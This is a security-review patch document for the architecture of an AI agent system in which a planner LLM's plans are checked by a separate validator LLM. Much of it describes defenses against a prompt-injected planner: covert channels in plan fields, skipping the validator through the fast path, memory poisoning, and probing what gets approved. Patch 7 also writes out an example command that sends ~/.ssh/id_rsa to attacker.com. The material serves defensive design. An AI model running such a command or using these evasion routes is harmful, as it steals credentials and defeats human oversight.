# Architecture Patches: Security Expert Review

> **Source**: `docs/critics/security-expert.md`
> **Target**: `docs/architecture.md` (v1.2)
> **Date**: 2026-02-09

Each patch below identifies a specific section to modify, the rationale from the review, and the proposed text changes. Patches are ordered by severity (Critical > High > Medium > Low) then by section number.

---

## Patch 1: Strip Free-Form Fields From Plans Before Sentinel Review

**Severity**: Critical
**Review Finding**: #2.1 — Steganographic Channels in Plan Structure
**Target Section**: 5.3.1 (Why Sentinel Must Be Separate), 4.5 (Data Flow — step 6)

### Rationale

The `ExecutionPlan` and `ExecutionStep` interfaces contain `[key: string]: unknown` free-form fields. Scout can include arbitrary key-value pairs that pass through Axis opaquely to Sentinel. A prompt-injected Scout could encode the user's original message in field names, `reasoning` fields, or `description` fields — creating a wide-open covert channel that bypasses the information barrier. The reviewer calls this the "single most impactful change" needed.

### Changes

**5.3.1 — Add after the information barrier table:**

```markdown
#### Plan Sanitization for Sentinel

Before Axis sends a plan to Sentinel, it strips all free-form fields from the `ExecutionPlan`
and its `ExecutionStep` objects. Sentinel receives only the required fields:

- **ExecutionPlan**: `id`, `jobId`, `steps`
- **ExecutionStep**: `id`, `gear`, `action`, `parameters`, `riskLevel`

This minimizes the information-theoretic channel between Scout and Sentinel, preventing a
compromised Scout from embedding persuasive framing, the user's original message, or
manipulative instructions in fields like `reasoning`, `description`, or arbitrarily-named
keys.

Scout's `riskLevel` assessment is included because Sentinel needs it for prioritization, but
Sentinel is instructed to perform its own independent risk assessment and not trust Scout's
label. If Sentinel's assessment diverges from Scout's by more than one level (e.g., Scout says
"low" but Sentinel determines "high"), this divergence is logged as an anomaly.

**Acknowledged limitation:** The `parameters` field on each step inherently carries user intent
(e.g., a search query contains the user's words, an email recipient reflects who the user
wants to contact). This is an architectural necessity — Sentinel must see parameters to evaluate
risk. The information barrier prevents Sentinel from seeing the user's *original message with
its conversational context and framing*, not all traces of user intent. A sophisticated prompt
injection could craft parameters that carry an injection payload; this is mitigated by
Sentinel's independent evaluation posture and its lack of access to any context that would
make such payloads persuasive.
```

**4.5 — Amend step 6:**

Current:
> 6. **Validation**: Axis sends *only the execution plan* (not the user's original message) to Sentinel. Sentinel checks its memory for matching precedent decisions (see 5.3.8), then evaluates remaining steps against security policies, privacy rules, ethical guidelines, cost limits, and legal constraints.

Proposed:
> 6. **Validation**: Axis first strips all free-form fields from the execution plan, leaving only the required fields (see 5.3.1 — Plan Sanitization). Axis then sends the sanitized plan (never the user's original message) to Sentinel. Sentinel checks its memory for matching precedent decisions (see 5.3.8), then evaluates remaining steps against security policies, privacy rules, ethical guidelines, cost limits, and legal constraints. Sentinel also performs composite-action analysis — evaluating the combined effect of all steps (e.g., "read credentials file then make external network request") rather than only individual steps.

---

## Patch 2: Switch to Per-Component Asymmetric Signing

**Severity**: Critical (High from reviewer, escalated due to it directly contradicting an existing security claim)
**Review Finding**: #6 — HMAC Signing Weaknesses
**Target Section**: 6.3 (Internal Component Authentication), 9.1 (Internal API)

### Rationale

The architecture uses a single shared HMAC-SHA256 key for all inter-component message signing. This means any component that holds the key can forge messages from any other component — directly contradicting the claim that "a compromised Gear cannot impersonate Scout or Sentinel." Switching to per-component asymmetric keypairs (Ed25519) eliminates this single-point-of-compromise and makes the impersonation claim actually hold.

### Changes

**6.3 — Replace the "Internal Component Authentication" section:**

Current:
> - Components communicate through Axis using signed messages (HMAC-SHA256).
> - Signing key is generated at install time and stored in the encrypted vault.
> - A compromised Gear cannot impersonate Scout or Sentinel.

Proposed:
```markdown
#### Internal Component Authentication

Components communicate through Axis using asymmetric message signatures (Ed25519):

- **Per-component keypairs**: Each component (Scout, Sentinel, Journal, Bridge, and each Gear
  instance) has its own Ed25519 keypair generated at install/registration time.
- **Private key isolation**: Each component holds only its own private key. Private keys for
  trusted components (Scout, Sentinel, Journal, Bridge) are stored in the encrypted vault.
  Gear processes receive ephemeral keypairs generated per-execution that are not stored.
- **Public key registry**: Axis holds all public keys and verifies every inbound message
  against the sender's registered public key.
- **Impersonation prevention**: A compromised Gear cannot forge messages from Scout, Sentinel,
  or any other component because it does not possess their private keys. This is a structural
  guarantee, not a policy guarantee.
- **Key rotation**: Component keypairs can be rotated independently. Axis supports a brief
  overlap period where both old and new public keys are accepted for a component, enabling
  zero-downtime rotation.
```

**9.1 — Amend the AxisMessage interface:**

Current:
```typescript
interface AxisMessage {
  id: string;
  from: ComponentId;
  to: ComponentId;
  type: string;
  signature: string;             // HMAC-SHA256 signature
  [key: string]: unknown;
}
```

Proposed:
```typescript
interface AxisMessage {
  // --- Required (Axis needs these for routing and verification) ---
  id: string;                    // UUID v7 (unique, time-sortable — serves as implicit nonce)
  timestamp: string;             // ISO 8601 — required, included in signed content
  from: ComponentId;             // Sender
  to: ComponentId;               // Recipient
  type: string;                  // Message type
  signature: string;             // Ed25519 signature over (id + timestamp + from + to + type + payload hash)

  // --- Free-form (components include whatever is relevant) ---
  [key: string]: unknown;       // payload, replyTo, metadata, etc.
}
```

**9.1 — Add after the AxisMessage interface:**

```markdown
**Replay protection:** The `id` and `timestamp` fields are both required and included in the
signed content. Axis rejects messages with duplicate `id` values (tracked in a sliding window)
and messages with `timestamp` more than 60 seconds old. This prevents replay attacks where a
captured approval message is re-sent to authorize a different plan.
```

---

## Patch 3: Expand Threat Model

**Severity**: High
**Review Finding**: #1 — Threat Model Gaps
**Target Section**: 6.1 (Threat Model)

### Rationale

The threat model lists five adversaries but is missing several important ones: insider/developer threats (critical for an open-source project), npm supply chain attacks, LLM provider compromise scenarios beyond data logging, and denial of service. These gaps could lead to blind spots during implementation.

### Changes

**6.1 — Add the following rows to the threat model table:**

```markdown
| Adversary | Goal | Attack Vector |
|-----------|------|---------------|
| Malicious contributor | Weaken security controls | Submitting PRs that subtly weaken Sentinel validation, introduce sandbox backdoors, or modify signature verification |
| npm supply chain attacker | Execute arbitrary code | Typosquatting, dependency confusion on `@meridian/*`, compromised maintainer accounts, malicious postinstall scripts in transitive dependencies |
| Compromised LLM provider (advanced) | Manipulate agent behavior | Serving modified model responses that produce structurally valid but subtly harmful plans, targeted response manipulation for high-value users, simultaneous compromise of Scout and Sentinel when using the same provider |
| Denial-of-service attacker | Exhaust resources or disrupt service | Flooding the Bridge API, submitting tasks that exhaust LLM API cost limits (economic DoS), triggering multiple concurrent Gear executions to overwhelm constrained devices |
```

**6.1 — Add after the threat model table:**

```markdown
### 6.1.1 Supply Chain Defenses

npm supply chain attacks are a significant risk. Meridian implements the following defenses:

- **Namespace registration**: The `@meridian` scope is registered on the public npm registry
  to prevent dependency confusion attacks.
- **Install script restriction**: `npm install` runs with `--ignore-scripts` by default. An
  explicit allowlist specifies packages permitted to run install scripts.
- **Integrity verification**: Lockfiles include integrity hashes (`npm install
  --package-lock-only` with `integrity` fields). CI verifies that installed packages match
  lockfile hashes.
- **Dependency scanning**: Automated CVE scanning (`npm audit`, supplemented by Snyk or
  Socket) runs on every build and PR.
- **SBOM generation**: A Software Bill of Materials is generated for each release.
- **Signed commits**: All commits to security-sensitive paths (sentinel, sandbox, auth, crypto)
  must be GPG-signed.
- **Reproducible builds**: Release artifacts are reproducibly built so that the published
  binary can be verified against the source.

### 6.1.2 LLM Provider Risk Mitigation

A compromised LLM provider can do more than log prompts. The following configurations and
mitigations address provider-level threats:

- **Default recommendation**: Use different providers for Scout and Sentinel (e.g., Anthropic
  for Scout, OpenAI for Sentinel). This is the **recommended default**, not merely the "high
  security" option, because using the same provider for both defeats the purpose of the
  dual-LLM trust boundary.
- **Same-provider warning**: If the user configures the same provider for Scout and Sentinel,
  Bridge displays a persistent warning explaining the reduced security posture.
- **Response consistency checks**: For high-risk plans (risk level "high" or "critical"), Axis
  can optionally request Sentinel validation twice with different phrasing and compare verdicts.
  Inconsistent verdicts trigger manual review.
```

---

## Patch 4: Harden Gear Sandbox — TOCTOU, Secret Injection, and Escape Vectors

**Severity**: High
**Review Finding**: #3 — Sandbox Escape Vectors
**Target Section**: 5.6.3 (Sandboxing Model), 5.6.4 (Gear Lifecycle)

### Rationale

The reviewer identifies several sandbox weaknesses: (1) TOCTOU race between Gear verification at install time and code loading at execution time, (2) secrets injected as environment variables are visible in `/proc/1/environ` inside containers, and (3) the layering of `isolated-vm` within child processes is ambiguous. These need explicit specification.

### Changes

**5.6.3 — Add after "Level 1: Process Isolation (Default)":**

```markdown
**Sandbox layering (Level 1):** The defense-in-depth model is: child process (dropped
privileges, seccomp/sandbox-exec filtering) containing an `isolated-vm` V8 isolate. The child
process provides OS-level resource isolation and syscall restriction. The V8 isolate provides
JavaScript-level API restriction — the only APIs available to Gear code are those exposed
through the `GearContext` interface. These two layers are complementary: the isolate prevents
casual access to Node.js APIs, while the OS-level sandbox prevents escape via native code or
V8 vulnerabilities.
```

**5.6.3 — In the Level 2 container description, replace the secrets injection line:**

Current:
> → injects declared secrets as env vars

Proposed:
```markdown
→ injects declared secrets as temporary files mounted at `/run/secrets/<name>`,
  readable only by the Gear process. Files are backed by tmpfs (in-memory, never
  written to disk) and automatically removed when the container is destroyed.
  Secrets are NOT injected as environment variables, because environment variables
  are visible via `/proc/1/environ` and inherited by child processes.
```

**5.6.4 — Add to the user-installed/built-in Gear lifecycle, after "Execute → Result":**

```markdown
**Execution-time integrity check:** Before loading Gear code into the sandbox, Axis
re-computes the SHA-256 checksum of the Gear package and verifies it against the checksum
stored in the `gear` table at install time. If the checksums do not match, execution is
blocked, the Gear is disabled, and the user is notified of potential tampering. This prevents
TOCTOU attacks where Gear code is modified on disk between install-time verification and
execution-time loading.

For Journal-generated Gear, the checksum is computed when the user approves the draft and
stored in the `gear` table. Any subsequent modification to the Gear files requires re-approval.
```

---

## Patch 5: Strengthen Prompt Injection Defenses

**Severity**: High
**Review Finding**: #4 — Prompt Injection Realism
**Target Section**: 5.2.6 (Prompt Injection Defense)

### Rationale

The `<external_content>` wrapping is known to be bypassable (tag escape, instruction-data confusion, token manipulation). The reviewer also identifies the Reflector as an injection amplifier — a successful injection can persist as poisoned memories that influence future plans. The document should be explicit that content tagging is a soft defense layer and specify the hard security boundaries.

### Changes

**5.2.6 — Add after the `<external_content>` example:**

```markdown
**Defense-in-depth layering:** Content provenance tagging is a *soft* defense — it reduces the
attack surface but is not a security boundary. LLMs do not reliably respect delimiter-based
boundaries, and known bypass techniques exist (tag escape, instruction-data confusion, token-
level manipulation). The actual security boundaries in Meridian are:

1. **Structured plan output**: Scout must produce valid JSON conforming to the `ExecutionPlan`
   schema. Free-form text is not executable — all actions must resolve to declared Gear and
   declared actions with schema-validated parameters.
2. **Plan sanitization**: Axis strips free-form fields before Sentinel sees the plan (see
   5.3.1), preventing manipulative framing from reaching the validator.
3. **Sentinel's independent review**: Sentinel evaluates the sanitized plan without access to
   the original input, breaking the injection chain.
4. **Sandbox enforcement**: Even if a plan is approved, Gear cannot exceed declared permissions
   at runtime. A manipulated plan that requests unauthorized actions fails at the sandbox level.

Content tagging provides defense-in-depth but is never the sole control for any security
property.

**Multi-hop injection via Gear output:** When Gear returns results (e.g., web page content,
email bodies, API responses), the results are tagged with `source: "gear:<gear-id>"` provenance
before being passed back to Scout. Scout's context assembly applies the same untrusted-content
treatment to Gear output as it does to external content. This prevents the attack pattern where
benign initial content references a URL that, when fetched, contains the actual injection
payload.

**Injection persistence via memory (Reflector hardening):** If a prompt injection succeeds
partially and the task completes, Journal's Reflector could store attacker-influenced content
as memories, creating a persistent injection. Mitigations:

- Memories derived from tasks that processed external content are tagged with
  `external_content_involved: true` and stored with reduced initial confidence.
- The Reflector applies an instruction/data classifier to extracted patterns. Content that
  contains instruction-like patterns (imperative sentences directed at an AI, system prompt
  fragments, role-play directives) is flagged and either excluded from future Scout context
  or stripped of instruction-like content while preserving factual information.
- Users can review externally-influenced memories separately in Bridge (filtered by the
  `external_content_involved` tag).
```

---

## Patch 6: Acknowledge JavaScript Secret-Zeroing Limitations

**Severity**: High
**Review Finding**: #5 — Secrets Management Gaps
**Target Section**: 6.4 (Secrets Management)

### Rationale

JavaScript/Node.js uses a garbage-collected runtime. Immutable strings cannot be reliably zeroed — `secret = ''` does not erase the original string from memory. V8's GC may also copy objects during compaction, leaving copies in previously-used memory pages. The document should be honest about this limitation and specify the best-effort approach.

### Changes

**6.4 — Replace the "In memory" bullet:**

Current:
> - **In memory**: Secrets are decrypted only when needed, held in memory for the minimum necessary duration, then zeroed.

Proposed:
```markdown
- **In memory**: Secrets are decrypted only when needed, held in memory for the minimum
  necessary duration, then cleared on a best-effort basis. **Known limitation**: JavaScript
  strings are immutable and managed by V8's garbage collector — setting a variable to `''`
  does not zero the original string in memory. The original value persists until GC reclaims
  the memory, and even then the memory may not be zeroed. V8's compacting GC may also create
  copies of secrets in previously-used memory pages. Mitigations:
  - Secrets are handled as `Buffer` objects (not strings) wherever possible. Buffers can be
    explicitly zeroed with `buffer.fill(0)`.
  - Secrets are never converted from `Buffer` to `string` except at the point of use (e.g.,
    setting an HTTP header). The resulting string reference is not stored.
  - For the highest-security deployments, a native addon (N-API) can manage secret memory
    outside V8's heap, enabling reliable zeroing and `mlock` to prevent swapping.
  - This limitation is inherent to managed runtimes and is shared by every Node.js application
    that handles secrets. It does not negate the other secret management controls (encryption
    at rest, ACLs, no-logging).
```

**6.4 — Add after the Secret interface:**

```markdown
**Master key lifecycle:**

- **Derivation**: The master key is derived from the user's password using Argon2id with
  parameters tuned per deployment tier: 64 MiB memory / 3 iterations on standard devices,
  19 MiB / 2 iterations on Raspberry Pi (OWASP minimum).
- **Caching**: The derived key is held in memory for the duration of the Meridian process.
  It is not written to disk. On restart, the user must provide the password (or the key
  must be provided via `MERIDIAN_MASTER_KEY_FILE` for headless deployments).
- **Recovery**: There is no password recovery mechanism. If the master password is lost, all
  encrypted secrets are irrecoverable. Users are prompted during setup to store their master
  password in a separate password manager.
- **Rotation**: The user can rotate the master password through Bridge. This re-encrypts the
  entire vault with a new derived key. The old key is zeroed (best-effort) after re-encryption.
- **Host-side key file**: When using Docker secrets (`MERIDIAN_MASTER_KEY_FILE`), the source
  file on the host filesystem must be protected with `chmod 600` and ideally deleted after
  container creation. The setup wizard warns about this.
```

---

## Patch 7: Harden Shell Gear and Sentinel Memory Auto-Approval

**Severity**: High
**Review Finding**: #14.3 — The `shell` Built-in Gear
**Target Section**: 5.6.5 (Built-in Gear), 5.3.8 (Sentinel Memory)

### Rationale

Shell access fundamentally undermines the sandbox model — commands run with the Meridian process's permissions. Sentinel Memory's glob-based auto-approval for shell commands is dangerous because an attacker can craft commands that match approved patterns but contain additional malicious components (e.g., `git push origin main; curl attacker.com/exfil`).

### Changes

**5.6.5 — Amend the `shell` Gear row in the table and add a note:**

Current:
> | `shell` | Execute shell commands (requires explicit user approval per-command) | Critical |

Proposed:
> | `shell` | Execute shell commands (requires fresh user approval per-command, never auto-approved) | Critical |

**5.6.5 — Add after the table:**

```markdown
**Shell Gear restrictions:** The `shell` Gear is exempt from Sentinel Memory auto-approval
(Section 5.3.8). Every shell command requires fresh user approval regardless of precedent,
because:

1. Shell commands are opaque — the security implications of a command string cannot be reliably
   assessed by pattern matching. A glob pattern like `git push origin*` would also match
   `git push origin main; curl attacker.com/exfil?data=$(cat ~/.ssh/id_rsa)`.
2. Shell commands run with the Meridian process's OS permissions, outside the Gear sandbox.
3. The risk of auto-approving a subtly different shell command is catastrophic compared to the
   convenience cost of manual approval.

The `shell` Gear is disabled by default and must be explicitly enabled by the user through
Bridge. When enabled, Bridge displays a persistent indicator that shell access is active.
```

**5.3.8 — Add to the "Safety properties" list:**

```markdown
- Shell commands (`actionType: "shell.execute"`) are permanently excluded from Sentinel Memory
  auto-approval. This exclusion cannot be overridden by user configuration. Every shell command
  requires fresh user approval through Bridge.
- Sentinel Memory matching for non-shell actions uses exact-match on `scope` rather than glob
  patterns for action types with `riskLevel: "critical"`. Glob matching is permitted only for
  `riskLevel: "low"` and `"medium"` actions.
```

---

## Patch 8: Add Fast-Path Verification in Axis

**Severity**: High (Medium from reviewer, escalated because it's a Sentinel bypass)
**Review Finding**: #14.1 — Fast Path as a Security Bypass
**Target Section**: 4.3 (Fast Path vs. Full Path)

### Rationale

Scout determines whether to use the fast path (no Sentinel, no Gear) or full path. A prompt-injected Scout could classify an action-requiring task as conversational, bypassing Sentinel entirely. While fast-path responses are text-only and cannot execute actions, Axis should independently verify the classification.

### Changes

**4.3 — Add after "If Scout is uncertain, it defaults to the full path (fail-safe).":**

```markdown
**Axis fast-path verification:** Axis does not blindly trust Scout's path classification.
Before delivering a fast-path response to Bridge, Axis performs structural checks:

1. The response does not contain JSON structures resembling execution plans.
2. The response does not reference Gear names or action names from the registered catalog.
3. The response does not contain patterns suggesting deferred action (e.g., "I've gone ahead
   and...", "I've completed the task...") that would be inappropriate for a text-only response.

If any check fails, Axis rejects the fast-path response and re-routes the original message
through the full path with Sentinel validation. These checks are deterministic pattern matching,
not LLM calls.

Fast-path usage is logged with enough context for anomaly detection. A spike in fast-path
responses relative to the user's historical pattern is surfaced as a warning in Bridge.
```

---

## Patch 9: Specify Web Security Headers

**Severity**: Medium
**Review Finding**: #12 — Missing Web Security Controls
**Target Section**: 5.5 (Bridge — User Interface), add new subsection 5.5.8

### Rationale

The architecture does not mention CSP, CORS, or clickjacking protections. Bridge is a React SPA that renders markdown from LLM responses, displays content fetched from the web, and accepts file attachments — all potential XSS vectors. Without a strict CSP, a stored XSS in a Gear response could make API calls on behalf of the user.

### Changes

**Add Section 5.5.8 after 5.5.7:**

```markdown
#### 5.5.8 Web Security Headers

Bridge serves the following security headers on all responses:

| Header | Value | Purpose |
|--------|-------|---------|
| `Content-Security-Policy` | `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; connect-src 'self' ws://localhost:* wss://localhost:*; frame-ancestors 'none'` | Prevents XSS, restricts resource loading, blocks framing |
| `X-Content-Type-Options` | `nosniff` | Prevents MIME-type sniffing |
| `X-Frame-Options` | `DENY` | Redundant clickjacking protection (backup for `frame-ancestors`) |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Limits referrer leakage |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=()` | Restricts browser API access |

**CORS policy:** Bridge's API responds to cross-origin requests only from the exact origin
serving the Bridge UI (default: `http://127.0.0.1:3200`). All other origins are rejected. If
remote access is configured with a custom domain, that domain is added to the CORS allowlist.
The CORS configuration does not use wildcards.

**Content rendering:** LLM responses and Gear output displayed in Bridge are rendered through
a sanitization layer that strips potentially dangerous HTML (scripts, iframes, event handlers,
`javascript:` URLs) before display. Markdown rendering uses a sanitized renderer that does not
support raw HTML injection.
```

---

## Patch 10: Specify WebSocket Authentication

**Severity**: Medium
**Review Finding**: #7.2 — WebSocket Authentication
**Target Section**: 5.5.4 (Real-Time Streaming)

### Rationale

The document does not describe how WebSocket connections are authenticated. WebSocket connections are not protected by SameSite cookies after the initial upgrade. A Cross-Site WebSocket Hijacking (CSWSH) attack could allow a malicious page to open a WebSocket to Bridge using the victim's cookies.

### Changes

**5.5.4 — Add after the WSMessage interface:**

```markdown
**WebSocket authentication:**

- **Origin validation**: On WebSocket upgrade, Bridge validates the `Origin` header against
  the configured allowed origins (default: `http://127.0.0.1:3200`). Upgrade requests from
  unrecognized origins are rejected.
- **Session validation at upgrade**: The session cookie is validated during the HTTP upgrade
  handshake. Connections without a valid session are rejected with 401.
- **Connection token**: After successful upgrade, the client sends an authentication message
  containing a one-time connection token issued by the REST API. This token is consumed on
  use, preventing replay.
- **Periodic re-validation**: Long-lived WebSocket connections re-validate the session every
  15 minutes. If the session has expired or been revoked, the connection is terminated with a
  close frame containing a re-authentication prompt.
- **Rate limiting**: Incoming WebSocket frames are rate-limited to 60 messages/minute per
  connection. Connections exceeding the limit receive a warning; persistent abuse triggers
  disconnection.
```

---

## Patch 11: Add Audit Log Integrity Chain

**Severity**: Medium
**Review Finding**: #8 — Audit Log Integrity
**Target Section**: 6.6 (Audit Logging)

### Rationale

Individual audit entries can currently be modified or deleted without detection. A hash chain makes tampering detectable (though not preventable on a self-hosted system). This is a meaningful improvement for forensic analysis.

### Changes

**6.6 — Add to the AuditEntry interface:**

```typescript
interface AuditEntry {
  id: string;
  timestamp: string;
  actor: 'user' | 'scout' | 'sentinel' | 'axis' | 'gear';
  actorId?: string;
  action: string;
  target?: string;
  details: Record<string, unknown>;
  jobId?: string;
  riskLevel: 'low' | 'medium' | 'high' | 'critical';
  previousHash: string;           // SHA-256 of the previous entry (hash chain)
  entryHash: string;              // SHA-256 of this entry's content + previousHash
}
```

**6.6 — Add after the existing audit log description:**

```markdown
**Hash chain integrity:** Each audit entry includes a SHA-256 hash of the previous entry
(`previousHash`) and a hash of its own content combined with `previousHash` (`entryHash`).
This creates a hash chain that makes tampering detectable:

- Modifying any entry breaks the chain for all subsequent entries.
- Deleting an entry creates a gap detectable by hash verification.
- The first entry in each audit log file uses a well-known genesis hash.

Bridge includes an "Audit Integrity" panel that verifies the full hash chain on demand and
reports any breaks. This does not prevent tampering (a sophisticated attacker can recompute
the chain), but it detects casual tampering and accidental corruption.

**Optional remote mirroring:** For high-security deployments, audit entries can be
asynchronously mirrored to an external service (configured via Gear) to provide an independent
copy that a local attacker cannot modify. This is opt-in and not enabled by default.
```

---

## Patch 12: Add CSRF Protection for Approval Endpoint

**Severity**: Medium
**Review Finding**: #7.1 — CSRF Protection
**Target Section**: 5.5.6 (Authentication)

### Rationale

While `SameSite=Strict` provides strong CSRF protection, the `/api/jobs/:id/approve` endpoint is a high-value target. Defense in depth with explicit CSRF tokens is appropriate for security-critical actions.

### Changes

**5.5.6 — Add after the session management bullet:**

```markdown
- **CSRF protection**: All state-changing REST endpoints include CSRF token validation as
  defense in depth alongside `SameSite=Strict` cookies. The CSRF token is issued as part of
  the session and must be included in a custom header (`X-CSRF-Token`) on every POST, PUT,
  and DELETE request. The approval endpoint (`/api/jobs/:id/approve`) additionally requires
  the CSRF token to match a per-job nonce issued when the approval request was created,
  preventing approval of a different job than the one the user reviewed.
```

---

## Patch 13: Add Replay Protection to AxisMessage

**Severity**: Medium
**Review Finding**: #14.2 — Replay Attacks on AxisMessages
**Target Section**: 9.1 (Internal API)

### Rationale

The AxisMessage interface has no required timestamp or nonce. A captured Sentinel `APPROVED` message could be replayed to approve a different plan. While UUID v7 message IDs are unique and time-sortable, replay protection must be explicitly specified.

### Changes

This patch is covered by the AxisMessage changes in Patch 2 (the `timestamp` required field, signature computation, and replay rejection logic). No additional changes needed beyond Patch 2.

---

## Patch 14: Add Sentinel Memory Indirect Channel Acknowledgment

**Severity**: Medium
**Review Finding**: #2.5 — Sentinel Memory as Indirect Channel
**Target Section**: 5.3.8 (Sentinel Memory)

### Rationale

Over time, accumulated Sentinel Memory decisions create a profile shaped by Scout's plans. A compromised Scout could probe capabilities by generating plans that map out what the user will approve or deny, indirectly shaping Sentinel's future behavior.

### Changes

**5.3.8 — Add to the "Safety properties" list:**

```markdown
- **Decision count limits**: Sentinel Memory retains at most 500 active decisions. When the
  limit is reached, the oldest decisions are expired first. This bounds the profile that
  accumulated decisions can create.
- **Anomaly detection**: If Sentinel Memory records more than 10 `deny` decisions for the
  same `actionType` within a 24-hour period, this is flagged as a potential probing pattern
  and surfaced to the user in Bridge. The pattern may indicate a compromised Scout
  systematically testing approval boundaries.
```

---

## Patch 15: Encrypt Backups

**Severity**: Medium
**Review Finding**: #14.5 — Backup Security
**Target Section**: 8.4 (Backup and Recovery)

### Rationale

Automated backups contain all SQLite databases including the encrypted secrets vault, Sentinel memory, and conversation history. Unencrypted backups are a high-value target for local attackers.

### Changes

**8.4 — Amend the "Automated backups" bullet:**

Current:
> - **Automated backups**: Daily backup of all SQLite databases to a configurable location (default: `data/backups/`).

Proposed:
```markdown
- **Automated backups**: Daily backup of all SQLite databases to a configurable location
  (default: `data/backups/`). Backups are encrypted using AES-256-GCM with a key derived from
  the master password (same Argon2id derivation as the secrets vault). This ensures that
  backups at rest are as protected as the live data. The backup encryption key is derived with
  a different salt than the secrets vault key, so compromising one does not directly compromise
  the other.
```

---

## Patch 16: Add Reflector PII Stripping Limitations

**Severity**: Medium
**Review Finding**: #14.6 — PII Stripping Reliability
**Target Section**: 5.4.7 (Memory Privacy)

### Rationale

PII stripping via regex/NER is inherently incomplete. Non-standard formats, context-dependent PII, and re-identification from context are not reliably detected. The document should acknowledge this limitation.

### Changes

**5.4.7 — Amend the PII stripping bullet:**

Current:
> - The Reflector strips PII (emails, phone numbers, addresses) from semantic and procedural memories before storage, replacing them with references to the user's identity record.

Proposed:
```markdown
- The Reflector strips common PII patterns (emails, phone numbers, addresses, credit card
  numbers) from semantic and procedural memories before storage, replacing them with references
  to the user's identity record. **Known limitation**: Pattern-based PII stripping is inherently
  incomplete. Non-standard formats, context-dependent PII (e.g., "the person who lives at the
  blue house on Main Street"), and information that allows re-identification from context are
  not reliably detected. Users handling particularly sensitive information should use the memory
  pause feature (see 5.4.6) during those interactions and review stored memories periodically
  through Bridge.
```

---

## Patch 17: Specify Network Security Implementation Details

**Severity**: Medium
**Review Finding**: #10 — Network Security Gaps
**Target Section**: 6.5 (Network Security)

### Rationale

The document does not address IPv6 private addresses, DNS rebinding implementation details, or HTTPS proxy design for Gear network filtering.

### Changes

**6.5 — Amend the SSRF bullet and add details:**

Current:
> - **No SSRF**: Axis validates all URLs before passing them to Gear. Private IP ranges (10.x, 172.16.x, 192.168.x, 127.x) are blocked by default for Gear network requests, with explicit opt-in for home automation use cases.

Proposed:
```markdown
- **No SSRF**: Axis validates all URLs before passing them to Gear. The following IP ranges
  are blocked by default for Gear network requests:
  - IPv4: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.0/8`, `169.254.0.0/16`
  - IPv6: `::1/128`, `fe80::/10` (link-local), `fd00::/8` (unique local),
    `::ffff:0:0/96` (IPv4-mapped IPv6 — prevents bypassing IPv4 blocks via IPv6 mapping)
  - Explicit opt-in for home automation use cases (e.g., Home Assistant at a local IP).
```

**6.5 — Add after the Gear network filtering bullet:**

```markdown
- **DNS rebinding prevention**: The Gear network proxy resolves DNS at request time and
  validates the resolved IP against the blocklist *after* resolution, not just at the domain
  level. DNS results are pinned for the duration of the Gear execution (TTL override) to
  prevent mid-execution rebinding. Multi-record DNS responses are validated — all resolved
  addresses must be non-private for the request to proceed.
- **Gear network proxy design**: The proxy operates at the CONNECT level for HTTPS traffic,
  enforcing domain-level restrictions without MITM. For HTTP traffic, full URL and content
  inspection is available. The proxy cannot inspect HTTPS request bodies or paths — this is
  an accepted limitation. Gear with legitimate access to a domain could theoretically use that
  access for unintended purposes on permitted paths. Network volume limits per Gear
  (`maxNetworkBytesPerCall` in the manifest) provide a partial mitigation.
```

---

## Patch 18: Specify TLS Configuration

**Severity**: Medium
**Review Finding**: #11.4 — Missing TLS Configuration Guidance
**Target Section**: 6.5 (Network Security)

### Rationale

When remote access is enabled, "TLS is mandatory" but no TLS version, cipher suite, or header requirements are specified.

### Changes

**6.5 — Amend the TLS bullet:**

Current:
> - **TLS**: When remote access is enabled, TLS is mandatory. Meridian can use Let's Encrypt via ACME, or a user-provided certificate.

Proposed:
```markdown
- **TLS**: When remote access is enabled, TLS is mandatory with the following requirements:
  - Minimum TLS 1.2 (TLS 1.3 recommended and preferred in negotiation).
  - Restricted cipher suites: no 3DES, no RC4, no CBC-mode ciphers. Only AEAD cipher suites
    (AES-GCM, ChaCha20-Poly1305) are permitted.
  - HSTS header (`Strict-Transport-Security: max-age=31536000; includeSubDomains`) is set when
    TLS is enabled.
  - OCSP stapling is enabled when using Let's Encrypt certificates.
  - Meridian can use Let's Encrypt via ACME, or a user-provided certificate.
```

---

## Patch 19: "Security by Default" — Add Security Posture Indicator

**Severity**: Medium
**Review Finding**: #13 — The "Security by Default" Claim
**Target Section**: 5.5 (Bridge) — add note, and 2 (Executive Summary)

### Rationale

The "security by default" claim is substantially achieved for critical properties but has gaps where defaults favor usability. Rather than removing the claim, Bridge should surface the user's actual security posture so they can make informed decisions.

### Changes

**5.5.1 — Add to Bridge responsibilities:**

```markdown
- Display a security posture indicator showing the user's current configuration strength
```

**5.5 — Add a note (can be placed in 5.5.2 or as a new 5.5.9):**

```markdown
#### 5.5.9 Security Posture Indicator

Bridge displays a persistent security posture indicator reflecting the user's current
configuration:

| Posture | Criteria |
|---------|----------|
| **High** | Different LLM providers for Scout and Sentinel, container-level Gear sandbox, session duration ≤ 24 hours, shell Gear disabled |
| **Standard** | Default configuration — same provider allowed, process-level sandbox, default session duration |
| **Degraded** | Any known-weak configuration: local-only models for both Scout and Sentinel, shell Gear enabled without container sandbox, session duration > 14 days |

The indicator is informational, not blocking. Users are free to run any configuration, but
they can see at a glance whether their setup achieves the full security model described in this
document or has known trade-offs. Clicking the indicator shows specific recommendations for
improving posture.
```

---

## Patch 20: Specify AES-256-GCM Nonce Management

**Severity**: Low
**Review Finding**: #11.1 — AES-256-GCM Nonce Management
**Target Section**: 6.4 (Secrets Management)

### Rationale

AES-256-GCM requires unique nonces for every encryption. The birthday problem means that after ~2^32 encryptions with random 96-bit nonces, a nonce collision becomes likely, completely breaking GCM security. For an infrequently-written secrets vault this is impractical, but it should be specified.

### Changes

**6.4 — Add after the "Encryption" bullet:**

```markdown
- **Nonce management**: Each encryption operation uses a 96-bit random nonce generated from
  a cryptographically secure random source (`crypto.randomBytes`). For the secrets vault,
  which is written infrequently (new secrets, rotations), the probability of nonce collision
  is negligible. For higher-frequency encryption (e.g., backups), a counter-based nonce with
  a random prefix is used to eliminate collision risk entirely.
```

---

## Summary

| # | Patch | Severity | Section(s) Modified |
|---|-------|----------|-------------------|
| 1 | Strip free-form fields from plans before Sentinel review | Critical | 5.3.1, 4.5 |
